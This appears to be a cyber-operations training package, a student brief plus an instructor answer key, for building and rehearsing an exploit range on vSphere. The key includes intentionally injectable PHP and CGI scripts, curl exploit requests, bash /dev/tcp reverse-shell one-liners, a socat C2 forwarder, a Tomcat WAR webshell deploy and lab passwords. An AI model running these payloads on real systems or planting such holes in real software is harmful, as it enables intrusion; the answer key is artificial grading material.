# Build a Simulated Exploitation Range and Rehearse SOM

## Student Brief

**Phase:** Opening block (mission prep). **Duration:** Instructor-flexible (individual build + rehearsal). **Platform:** Shared vSphere / vCenter.

## Operational Context

You are preparing a notional counterstrike mission that depends on co-opting an edge **redirector** to place an implant on a **Windows** target that can call home only through that middle hop. Before live execution, build a **threat-representative** slice of that operational environment (OE) and **rehearse** your scheme of maneuver (SOM) / TTPs against it.

**Non-goal:** Recreating a full beacon farm, enterprise AD, or every edge service the adversary might own.

**Goal:** Instantiate only the **critical OE elements** — Kali ops, one vulnerable *nix redirector (choose A, B, or C), and a Windows target — then prove whether the planned TTP survives the real path: exploit redirector → reach Windows → place beacon → callback through the redirector to Kali.

## Access (Ops Station → Build Environment)

- **Primary method: vSphere / vCenter UI + VM Remote Console** from your ops station into your folder (**first name**; add last initial only if needed to disambiguate).

## Environment Constraints

|Constraint|Requirement|
|---|---|
|RAM|**≤ ~50 GB** concurrent powered-on memory in your resource pool|
|Addressing|Static hosts **only** in your assigned `/29` in **`172.16.45.0/24`**|
|DHCP half|**Do not** place static hosts in **`172.16.44.0/24`**|
|Media|Deploy from the instructor ISO catalog / thin templates only|

Gateway and DNS for the static half are posted by the instructor. Use the block the instructor assigns from this table:

|#|Block|Usable hosts|
|---|---|---|
|1|`172.16.45.0/29`|`172.16.45.1`–`.6`|
|2|`172.16.45.8/29`|`172.16.45.9`–`.14`|
|3|`172.16.45.16/29`|`172.16.45.17`–`.22`|
|4|`172.16.45.24/29`|`172.16.45.25`–`.30`|
|5|`172.16.45.32/29`|`172.16.45.33`–`.38`|
|6|`172.16.45.40/29`|`172.16.45.41`–`.46`|
|7|`172.16.45.48/29`|`172.16.45.49`–`.54`|
|8|`172.16.45.56/29`|`172.16.45.57`–`.62`|
|9|`172.16.45.64/29`|`172.16.45.65`–`.70`|
|10|`172.16.45.72/29`|`172.16.45.73`–`.78`|
|11|`172.16.45.80/29`|`172.16.45.81`–`.86`|
|12|`172.16.45.88/29`|`172.16.45.89`–`.94`|
|13|`172.16.45.96/29`|`172.16.45.97`–`.102`|
|14|`172.16.45.104/29`|`172.16.45.105`–`.110`|
|15|`172.16.45.112/29`|`172.16.45.113`–`.118`|
|16|`172.16.45.120/29`|`172.16.45.121`–`.126`|
|17|`172.16.45.128/29`|`172.16.45.129`–`.134`|
|18|`172.16.45.136/29`|`172.16.45.137`–`.142`|
|19|`172.16.45.144/29`|`172.16.45.145`–`.150`|
|20|`172.16.45.152/29`|`172.16.45.153`–`.158`|

## Notional Mission Package (FRAGO)

### Situation

Collection indicates an adversary edge path shaped like:

```
Kali ops  --exploit-->  Vulnerable *nix redirector  --RDP/SSH-->  Windows target
                ^                                              |
                +--------- C2 beacon callback (via redirector) +
```

You will **build** that lean cell yourself as a threat-representative range:

1. **Kali ops box** — attack platform and C2 listener.
2. **One dual-homed *nix redirector** — choose Option A, B, or C below.
3. **Windows target** — on the private side of the redirector; implant placed via RDP or SSH; beacon must call back **through** the redirector to Kali.

Exact Windows build, endpoint security, and production redirector package versions are only **partially known**. Document what you approximate.

### Mission

**Reconnoiter** your own plan quality by building the range and rehearsing the path. Pair rehearsed TTPs with **ATT&CK** technique IDs; note **ENGAGE** / **D3FEND** language you would use with blue-space partners.

Prove, through the **actual path**:

1. The chosen redirector is exploitable for RCE as designed.
2. From that foothold you can reach Windows via RDP or SSH.
3. A C2 beacon on Windows calls back **through** the redirector to Kali.
4. Which conditions make the TTP succeed, degrade, or fail.

### Access constraint (mission, not vSphere)

Do not shortcut by copying the implant onto Windows from Kali on a second invented path. Do not add ops-facing interactive SSH on the redirector just to make testing easier if that is not the chosen option's exploit surface. Rehearse the access method the option inventory describes.

### Friendly constraint

Shared cluster; no egress for ISO download; stay in your IP block; preserve enough RAM for later tool testing on the same pool. Classroom resource caps are a training constraint — operational ceilings will differ. Document what you could not reproduce.

## Redirector options (choose one)

Reconstruct inventory only. Build and configure from this card; do not expect instructor exploit steps in this brief.

### Option A — Soft-edge PHP (Ubuntu)

- **Base:** Ubuntu LTS; **dual NIC** (ops-facing + private to Windows)
- **Stack:** nginx or Apache + PHP-FPM
- **Surface:** edge site vhost with a PHP health/admin endpoint that shells out from a request parameter
- **Windows:** reachable from the private NIC via RDP (OpenSSH optional)
- **After RCE:** userland forwarder (socat / nginx stream / iptables DNAT) for C2 pass-back to Kali

### Option B — Legacy CGI (Debian)

- **Base:** Debian; **dual NIC** (ops-facing + private to Windows)
- **Stack:** Apache with `cgi` / `cgid` enabled
- **Surface:** CGI status/diagnostics script that unsafely interpolates query or environment input into a shell
- **Windows:** reachable from the private NIC via RDP or SSH
- **After RCE:** same userland forwarder expectation for C2 pass-back to Kali

### Option C — Tomcat Manager / WAR (Rocky or Alma)

- **Base:** Rocky Linux or AlmaLinux; **dual NIC** (ops-facing + private to Windows)
- **Stack:** Apache Tomcat (pin a major version)
- **Surface:** Manager app enabled; `tomcat-users.xml` role/user facts for manager-script / manager-gui
- **Windows:** reachable from the private NIC via RDP or SSH
- **After RCE:** same userland forwarder expectation for C2 pass-back to Kali

## Specific Tasks

1. **OE selection:** Keep Kali, one redirector option, and Windows. Write one sentence of rationale per kept element, and name what you will **not** build (for example extra domain services or a beacon farm).
    
2. **Choose option:** Pick A, B, or C. Record why that stack is a fair threat-representative stand-in for the edge you care about.
    
3. **Build:** Deploy and configure the three roles in vSphere under your folder. Stay inside the RAM cap and your static `/29`. Dual-home the redirector honestly.
    
4. **Document live state:** Network diagram (roles + addresses), host/role + RAM table, snapshot plan (at least one pre-rehearsal snapshot).
    
5. **Rehearse:** Exploit the chosen redirector → reach Windows via RDP or SSH → place a beacon that calls back through the redirector to Kali. Inject at least one friction condition (forwarder break, RDP deny, listener mismatch, wrong bind address). Vary at least one bound (callback port, forwarder tool, Windows access method). Record predicted vs observed. Tag TTPs with ATT&CK IDs.
    
6. **AAR:** Update the plan — sequencing, prerequisites, TTP choice, and the **effectiveness envelope**. Explain compromises so a reader cannot treat a lean green callback as proof against every plausible edge stack.
    

## Deliverables

Submit to the instructor:

1. **OE rationale** — kept elements with plan-linked justification, plus an explicit cut list; state which option (A/B/C) you built and why.
    
2. **Network diagram** — roles and addresses in your `/29` (show dual-home).
    
3. **Host / role / RAM table** — powered-on memory totaling ≤ ~50 GB.
4. **Snapshot plan** — names and purpose.
5. **SOM rehearsal script** — steps executed (exploit → lateral → callback through redirector), ATT&CK tags, friction inject, and at least one bound/limit test.
    
6. **Rehearsal after-action** — predicted vs observed; plan deltas; **context and compromises** (what you approximated and how that bounds the result).
    

## Success Criteria

- Every powered-on VM has a plan-linked rationale (no vanity hosts).
- Concurrent RAM stays within the ~50 GB pool limit.
- All static addresses are inside the assigned upper-half block.
- Rehearsal uses the **chosen redirector exploit path** (not comfort SSH unless that is the option surface).
    
- Beacon callback **traverses the redirector** to Kali (not a direct Windows→Kali shortcut).
    
- Rehearsal includes at least one friction inject, one limits/bounds test, and a written plan delta.
    
- Compromises are documented so results can be interpreted in context.
    
- Doctrine terms (SOM, CG/CV, reconnoiter intent) and MITRE ATT&CK tags appear together in the rehearsal product.

## Tie-Back

- **Planning:** METT-TC → EMLCOA → CG/CV → SOM → rehearsal discipline.
- **MITRE ATT&CK:** Technique tags on exploit, lateral movement, and C2 callback TTPs.
    
- **MITRE ENGAGE / D3FEND:** Partner-facing labels for blue-space implications of friction you observed (for example, edge exploitation or redirector inspection).
    

## PCTE range limitations

These limits apply on Persistent Cyber Training Environment (PCTE) ranges used by this Module. Treat the items below as a no-strike list when they exist. Not every item is present on every range or host.

Do not target, block, terminate, or delete range-control artifacts:

- **Network:** `10.0.0.0/8` (range control and instrumentation; do not block or flag that traffic). Routers past the edge-router in grey space. TCP `5672` (AMQP user-emulation on the control subnet), `49998`, and `49999`.
- **Accounts:** `range-admin` / `range_admin`, `range-control`, and `range`. Do not use accounts whose username or password contains `simspace`.
- **User emulation:** do not stop it. Typical paths: `C:\Program Files (x86)\Simspace\` and `C:\Users\<Username>\Simspace`. Scripts: `run-actuation.cmd`, `ueactuation.cmd`.
- **Directories:** `C:\Program Files\Puppet Labs` and the Simspace paths above.
- **Processes:** `java.exe`, `javaw.exe`, `ruby.exe`, `rubyw.exe`, `start.exe`, `chromedriver.exe`, `IEDriverServer.exe`, Metova, Selenium, WebDriver.

# Threat-Rep Mission Rehearsal Lab — Answer Key

**Audience:** Instructors only. Do not issue to students. **Student doc:** [student-brief.md](https://moodle.cso.ops/mod/assign/view.php?id=5710) **Shared env:** `environments/effects_lab_env/vsphere/README.md`

## Objective framing

Students build a lean threat-representative exploitation cell and rehearse:

1. Exploit a dual-homed *nix redirector (Option A, B, or C).
2. Reach a Windows target via RDP or SSH from that foothold.
3. Place a C2 beacon that calls back **through** the redirector to Kali.

Grade **OE rationale**, **budget discipline**, **path fidelity**, **friction / limits**, and **documented compromises**. There is no single Moodle flag.

## Gold topology (example addressing)

Use addresses inside the student's assigned `/29`. Example for block `172.16.45.0/29`:

|Role|Example IP|Notes|
|---|---|---|
|Kali ops|`172.16.45.1`|C2 listener; ops-facing|
|Redirector ops NIC|`172.16.45.2`|Exploit surface|
|Redirector private NIC|`172.16.45.3`|Path to Windows|
|Windows target|`172.16.45.4`|Default gateway → `172.16.45.3` (or route via redirector)|

Adjust to the assigned block. Keep all statics in `172.16.45.0/24`.

```
Kali .1  --exploit-->  Redirector .2/.3  --RDP/SSH-->  Windows .4
                 ^                                         |
                 +-------- C2 callback (forwarder) --------+
```

## Lab credentials (instructor gold defaults)

Rotate if the cadre prefers; document the rotation in the AAR context.

|Host|Account|Password / key|Purpose|
|---|---|---|---|
|Redirector (all options)|`root` or sudo user `edgeadmin`|`Edge!Redirect01`|Build/admin|
|Windows|`Administrator` or `winadmin`|`Win!Target01`|RDP / OpenSSH|
|Tomcat manager (Option C)|`manager`|`Tomcat!Mgr01`|manager-script / manager-gui|
|Kali|student operator account|local|Listener / tooling|

## Initial situational awareness (instructor demo)

Before live walkthrough on a gold cell, establish context on each hop.

**On Kali:**

```
date -u
hostname; whoami; pwd
uname -a
ip -br a
ss -tulpn
```

**On redirector (after console/SSH admin access during build — not the student exploit path):**

```
date -u
hostname; whoami; pwd
uname -a
ip -br a
ss -tulpn
```

**On Windows (PowerShell):**

```
Get-Date -AsUTC
hostname; whoami; pwd
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
ipconfig
netstat -ano
```

**Why this matters:** Confirms dual-home addressing, listening exploit surfaces, and that Windows default route points toward the redirector private NIC before you claim pass-back success.

---

## Shared post-RCE: Windows reach + C2 pass-back

These steps apply after foothold on any option.

### Reach Windows

From the redirector foothold (interactive shell obtained via the option exploit):

```
# RDP from redirector if freerdp/xfreerdp available, or use credentials to
# enable/confirm OpenSSH and connect:
ping -c 2 172.16.45.4
```

Windows: enable RDP and/or OpenSSH Server; allow firewall for the private NIC; set default gateway to redirector private IP (`172.16.45.3` in the example).

### Forwarder on redirector (example: socat)

On Kali, start a listener (port example `443`):

```
# Example generic listener — use the C2 framework students chose in class
sudo nc -lvnp 443
```

On redirector (ops-facing listens, forwards to Kali):

```
# TCP pass-back: Windows -> redirector:8443 -> Kali:443
socat TCP-LISTEN:8443,fork,reuseaddr TCP:172.16.45.1:443
```

On Windows, point the beacon/callback host to `172.16.45.3:8443` (redirector private), **not** directly to Kali.

**How students know these values:** They chose the addresses on their diagram; the forwarder listen port is an operator knob they document; Kali listener port must match the forwarder target.

### Alternate forwarder (nginx stream)

```
stream {
    server {
        listen 8443;
        proxy_pass 172.16.45.1:443;
    }
}
```

---

## Option A — Soft-edge PHP (Ubuntu): setup + exploit

### Setup (instructor / gold rebuild)

1. Deploy Ubuntu LTS. Configure dual NIC (`.2` ops, `.3` private).
2. Install web stack:

```
sudo apt update
sudo apt install -y nginx php-fpm php-cli
```

3. Create site root and intentional unsafe health page (lab-only):

```
sudo mkdir -p /var/www/edge
sudo tee /var/www/edge/health.php >/dev/null <<'EOF'
<?php
// LAB ONLY — intentional OS command injection for threat-rep reconstruct
if (isset($_GET['q'])) {
    echo "<pre>";
    system($_GET['q']);
    echo "</pre>";
} else {
    echo "edge health ok";
}
EOF
```

4. Point nginx `root` to `/var/www/edge` and enable PHP-FPM for `.php`.
5. Confirm from Kali: `curl -s "[http://172.16.45.2/health.php](http://172.16.45.2/health.php)"` → `edge health ok`.
6. Build Windows on `.4` with gateway `.3`; enable RDP/SSH.

### Exploit walkthrough

```
# Confirm injection (whoami)
curl -s "http://172.16.45.2/health.php?q=whoami"

# Reverse shell example (adjust IP/port). On Kali: nc -lvnp 4444
curl -s "http://172.16.45.2/health.php?q=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/172.16.45.1/4444%200>%261'"
```

**First-use notes:**

- `curl` issues the HTTP request that hits the unsafe `system()` call.
- URL-encoding (`%20`, `%26`) preserves spaces and shell metacharacters in the query string.
- Prefer a stable interactive foothold before configuring `socat` / nginx stream.

Then complete **Shared post-RCE** steps.

### Expected findings

- `health.php?q=id` returns `www-data` (or PHP pool user).
- Private ping/RDP to Windows succeeds only via redirector private NIC.
- Beacon to Kali appears only when forwarder is up and Windows targets redirector.

---

## Option B — Legacy CGI (Debian): setup + exploit

### Setup

1. Deploy Debian. Dual NIC (`.2` / `.3`).
2. Install Apache CGI:

```
sudo apt update
sudo apt install -y apache2
sudo a2enmod cgid
sudo systemctl restart apache2
```

3. Place unsafe CGI status script:

```
sudo tee /usr/lib/cgi-bin/status.cgi >/dev/null <<'EOF'
#!/bin/bash
# LAB ONLY — intentional CGI command injection
echo "Content-Type: text/plain"
echo
echo "edge status"
if [ -n "$QUERY_STRING" ]; then
  # Naive parse: cmd=<command>
  cmd="${QUERY_STRING#cmd=}"
  cmd="${cmd%%&*}"
  cmd=$(printf '%b' "${cmd//%/\\x}")
  eval "$cmd"
fi
EOF
sudo chmod 755 /usr/lib/cgi-bin/status.cgi
```

4. Confirm: `curl -s "[http://172.16.45.2/cgi-bin/status.cgi](http://172.16.45.2/cgi-bin/status.cgi)"` → `edge status`.

### Exploit walkthrough

```
# whoami via cmd=
curl -s "http://172.16.45.2/cgi-bin/status.cgi?cmd=id"

# Reverse shell (Kali listening on 4444)
curl -s "http://172.16.45.2/cgi-bin/status.cgi?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/172.16.45.1/4444%200>%261'"
```

**First-use notes:**

- `a2enmod cgid` enables Apache CGI execution for scripts under the CGI directory.
- `QUERY_STRING` carries the attacker-controlled `cmd` value into the shell.
- URL-decode behavior in the script is intentionally fragile/lab-shaped; keep it simple for gold.

Then complete **Shared post-RCE** steps.

### Expected findings

- CGI responds as the Apache user (often `www-data`).
- Same dual-home / Windows / forwarder success criteria as Option A.

---

## Option C — Tomcat Manager / WAR (Rocky or Alma): setup + exploit

### Setup

1. Deploy Rocky or AlmaLinux. Dual NIC (`.2` / `.3`).
2. Install Tomcat (package names vary by major; example Tomcat 9):

```
sudo dnf install -y tomcat tomcat-webapps tomcat-admin-webapps
```

3. Configure manager roles/users in `/etc/tomcat/tomcat-users.xml` (paths may be `/etc/tomcat9/` depending on package):

```
<role rolename="manager-gui"/>
<role rolename="manager-script"/>
<user username="manager" password="Tomcat!Mgr01" roles="manager-gui,manager-script"/>
```

4. Ensure manager app is deployed (`/manager/html`). Allow access from the student `/29` in `manager.xml` valve / RemoteAddrValve if present (lab gold often comments out the restrictive valve).
    
5. Start/enable Tomcat; open port `8080` on the ops NIC.
    
6. Confirm: browse `[http://172.16.45.2:8080/manager/html](http://172.16.45.2:8080/manager/html)` with `manager` / `Tomcat!Mgr01`.

### Exploit walkthrough

1. From Kali, authenticate to Tomcat Manager.
2. Deploy a simple WAR webshell or reverse-shell WAR via **Deploy** / `manager/text/deploy`.
    
3. Hit the deployed context path to obtain RCE / reverse shell to Kali.
    
4. Complete **Shared post-RCE** steps (Windows + forwarder + beacon).

**Example manager deploy (curl text API):**

```
curl -u 'manager:Tomcat!Mgr01' \
  "http://172.16.45.2:8080/manager/text/deploy?path=/edge&update=true" \
  --upload-file /path/to/lab-shell.war
```

**First-use notes:**

- `manager-script` allows the text API; `manager-gui` allows the browser UI.
- `--upload-file` PUTs the WAR body to the deploy endpoint.
- Keep the lab WAR minimal; this is for cadre gold, not a student download pack.

### Expected findings

- Manager login succeeds with gold creds.
- Deployed WAR executes as the Tomcat service user.
- Same Windows / forwarder / callback criteria as A and B.

---

## Friction and limits (acceptable examples)

|Inject|Predicted|Observed teaching point|
|---|---|---|
|Stop `socat` / reload nginx without stream|Callback dies|Pass-back is load-bearing|
|Deny RDP, leave SSH only|Path changes|Document access-method bound|
|Point beacon at Kali directly|Still "green"|Fails path fidelity grading|
|Bind forwarder only on private NIC|Ops cannot test wrong interface|Interface discipline|

## Grading checkpoints

|Checkpoint|Acceptable|Not acceptable|
|---|---|---|
|OE rationale|Kali + one option + Windows justified; cut list present|Vanity hosts with no plan link|
|Option fidelity|Exploit matches A/B/C inventory|Comfort SSH replacing PHP/CGI/Tomcat surface|
|Path fidelity|Evidence of redirector traversal|Direct Windows→Kali only|
|Friction / limits|≥1 inject + ≥1 bound with predicted vs observed|Happy-path screenshots only|
|Compromises|Windows stand-in, lab creds, RAM cuts documented|Green result treated as universal proof|
|Resources|≤ ~50 GB; addresses in `/29`|DHCP-half theft; abandoned clones|

## Troubleshooting (consolidated)

|Symptom|Check|
|---|---|
|PHP/CGI 404|vhost root / CGI path; service running; firewall|
|Tomcat 403 on manager|RemoteAddrValve; roles in `tomcat-users.xml`; admin webapps installed|
|No Windows route|Dual NIC, Windows gateway, firewall, correct private IP|
|Listener silent|Forwarder down; beacon host/port wrong; Windows egress blocked|
|False green|Packet path never hits redirector — require middle-hop evidence|

## Tie-back

- Doctrine: SOM rehearsal against CG/CV edge path.
- ATT&CK: exploitation of public-facing app, lateral movement (RDP/SSH), C2 via proxy/redirector.
- ENGAGE/D3FEND: partner language for edge exposure and redirector inspection opportunities discovered during friction injects.